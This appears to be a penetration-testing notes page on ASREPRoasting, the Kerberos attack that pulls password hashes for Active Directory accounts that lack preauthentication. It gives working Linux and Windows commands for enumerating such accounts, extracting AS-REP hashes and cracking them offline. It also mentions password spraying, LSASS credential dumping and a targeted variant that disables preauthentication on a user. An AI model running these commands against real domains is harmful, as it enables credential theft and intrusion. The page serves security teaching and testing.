---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ASREPRoasting

## Concept

**ASREPRoasting** is an attack on the initial Kerberos authentication step and it is usually performed **after obtaining a list of valid domain users**.&#x20;

**Preauthentication** is a security feature in Kerberos where the client must prove knowledge of their password before the KDC issues a TGT. This is done by encrypting a timestamp with a key derived from the user’s password and sending it to the KDC. If the KDC can decrypt and validate the timestamp, it confirms the user knows their password — protecting against offline brute-force attacks.

If an account has the [`Do not require Kerberos pre-authentication`](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled then everyone can request from the DC to authenticate as that account and receive an **AS-REP**. The AS-REP contains the **TGT** which is encypted with the account's password hash which can be potentially cracked.

<figure><img src="../../../.gitbook/assets/asreproasting_process (2).png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Attack <a href="#windows" id="windows"></a>

{% tabs %}
{% tab title="Linux" %}
We can enumerate accounts with the preauthentication feature disabled using `nxc`, `GetNPUsers`, or `kerbrute`.

{% code overflow="wrap" %}
```bash
# Impacket's GetNPUsers script
GetNPUsers.py corp.com/robert

# Kerbrute
kerbrute userenum -d corp.com --dc 172.16.5.5 /opt/jsmith.txt
```
{% endcode %}

Then we can ASREPRoast the enumerated accounts using `GetNPUsers` or `nxc`.

{% code overflow="wrap" %}
```bash
# Impacket's GetNPUsers script
impacket-GetNPUsers.py corp.com/ -dc-ip 172.16.5.5 -no-pass -usersfile users.txt
# NetExec
nxc ldap 10.10.10.161 -u users.txt -p '' --asreproast asreproast.lst
```
{% endcode %}

Finally, we can crack the extracted hashes with `hashcat` or `john`.

{% code overflow="wrap" %}
```bash
# Hashcat
hashcat -m 18200 asreproast.lst /usr/share/wordlists/rockyou
# John
john --format=krb5asrep --wordlist=rockyou.txt --fork=4 asreproast.lst
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
We can enumerate accounts with the preauthentication feature disabled using [PowerView](../../../tools/active-directory/powerview.md).

{% code overflow="wrap" %}
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
{% endcode %}

Then we can ASREPRoast the enumerated accounts using [`rubeus`](../../../tools/active-directory/rubeus.md).

```powershell
.\Rubeus.exe asreproast /nowrap /format:hashcat
```

Finally, we can crack the extracted hashes on our attacking machine with `hashcat` or `john`.

{% code overflow="wrap" %}
```bash
# Hashcat
hashcat -m 18200 asreproast.lst /usr/share/wordlists/rockyou
# John
john --format=krb5asrep --wordlist=rockyou.txt --fork=4 asreproast.lst
```
{% endcode %}
{% endtab %}
{% endtabs %}

If we successfully crack the hash, we can perform a [password spraying](../../../tools/active-directory/netexec-cme.md#password-spray) attack across the network using NetExec. If the compromised user has local administrator privileges on any host, we can then extract cached credentials—such as those stored in [LSASS](../../../tools/active-directory/mimikatz.md#pass-the-hash)—using tools like Mimikatz.

> _For an example of ASREPRoasting with `nxc` check_ [_here_](https://x7331.gitbook.io/boxes/boxes/boxes/easy/sauna#asreproasting)_._

## Targeted ASREPRoasting

If we can't find any vulnerable users, but we have `GenericWrite` or `GenericAll` on a user object, we can modify that user's `UserAccountControl` to disable preauthentication and then perform the ASREP roast attack. Don't forget to reset the `UserAccountControl` after extraction!

## Resources

{% tabs %}
{% tab title="Video" %}
{% embed url="https://www.youtube.com/watch?index=4&list=PLDrNMcTNhhYqZj7WZt2GfNhBDqBnhW6AT&v=EVdwnBFtUtQ" %}
{% endtab %}

{% tab title="GetNPUsers" %}
{% embed url="https://www.youtube.com/watch?v=pZSyGRjHNO4" %}
The workings of GetNPUsers script!
{% endembed %}
{% endtab %}

{% tab title="Demo" %}
{% embed url="https://www.youtube.com/watch?v=wA9w8t1fRWo" %}
ASREPRoasting in 10 minutes!
{% endembed %}
{% endtab %}

{% tab title="Article" %}
{% embed url="https://blog.notso.pro/2020-05-07-offops-in-ad-0/" %}
A great article detailing each step of the Kerberos process.
{% endembed %}
{% endtab %}
{% endtabs %}
